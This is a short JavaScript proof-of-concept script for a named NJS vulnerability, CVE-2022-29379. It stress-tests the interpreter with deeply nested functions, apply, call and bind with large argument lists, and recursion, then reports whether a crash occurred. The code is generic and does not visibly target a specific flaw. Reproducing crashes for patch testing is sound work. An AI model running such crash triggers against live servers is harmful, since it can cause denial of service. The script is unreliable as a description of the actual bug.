// CVE-2022-29379 Proof of Concept
// Target: NJS versions with function call vulnerabilities
// Type: Function call stack manipulation

function main() {
    console.log("Starting CVE-2022-29379 reproduction...");
    
    try {
        // Create deeply nested function calls
        function createNestedFunction(depth) {
            if (depth <= 0) {
                return function() { return "base"; };
            }
            
            const nested = createNestedFunction(depth - 1);
            return function() {
                return nested.apply(this, arguments);
            };
        }
        
        // Create function with deep nesting
        const deepFunction = createNestedFunction(1000);
        
        // Create argument array that may trigger vulnerability
        const largeArgs = new Array(10000);
        for (let i = 0; i < largeArgs.length; i++) {
            largeArgs[i] = i;
        }
        
        // Function call operations that may trigger vulnerability
        console.log("Testing function.apply() with large arguments...");
        const applyResult = deepFunction.apply(null, largeArgs.slice(0, 100));
        
        console.log("Testing function.call() with many arguments...");
        const callResult = deepFunction.call(null, ...largeArgs.slice(0, 50));
        
        // Recursive function calls
        function recursiveFunction(n, acc) {
            if (n <= 0) return acc;
            return recursiveFunction(n - 1, acc + n);
        }
        
        console.log("Testing recursive calls...");
        const recursiveResult = recursiveFunction(1000, 0);
        
        // Function binding operations
        const boundFunction = deepFunction.bind(null, ...largeArgs.slice(0, 10));
        const boundResult = boundFunction();
        
        console.log("CVE-2022-29379: Function call operations completed");
        console.log("Apply result:", applyResult);
        console.log("Recursive result:", recursiveResult);
        console.log("No crash detected - likely patched");
        
    } catch (error) {
        console.log("Error:", error.message);
    }
}

main();